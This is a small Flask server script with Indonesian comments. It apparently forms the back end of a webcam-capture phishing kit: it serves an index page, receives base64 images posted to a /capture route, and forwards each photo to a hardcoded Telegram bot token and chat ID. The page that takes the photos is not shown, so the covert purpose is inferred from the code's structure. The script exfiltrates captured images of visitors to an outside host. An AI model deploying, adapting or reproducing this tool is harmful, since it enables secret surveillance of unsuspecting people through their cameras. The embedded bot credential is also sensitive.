from flask import Flask, request, send_file
import requests
import base64
import os
from datetime import datetime

app = Flask(__name__)

# ===== KONFIGURASI =====
# Ganti dengan token dari @BotFather
BOT_TOKEN = "8885534752:AAGynHfjh5D0IHsjEpX7bAAEMcafFwX2g8Q"
# Ganti dengan chat ID kamu (cari tahu dengan /getUpdates)
CHAT_ID = "7811148696"
# =======================

@app.route('/')
def index():
    return send_file('index.html')

@app.route('/capture', methods=['POST'])
def capture():
    data = request.json
    img_base64 = data.get('img')
    if not img_base64:
        return 'No image', 400

    # Hapus header base64 jika ada
    if img_base64.startswith('data:image'):
        img_base64 = img_base64.split(',')[1]

    img_bytes = base64.b64decode(img_base64)

    # Kirim ke Telegram
    files = {'photo': ('capture.jpg', img_bytes, 'image/jpeg')}
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    params = {'chat_id': CHAT_ID, 'caption': f'📸 {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}'}
    requests.post(url, files=files, data=params)

    return 'OK', 200

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)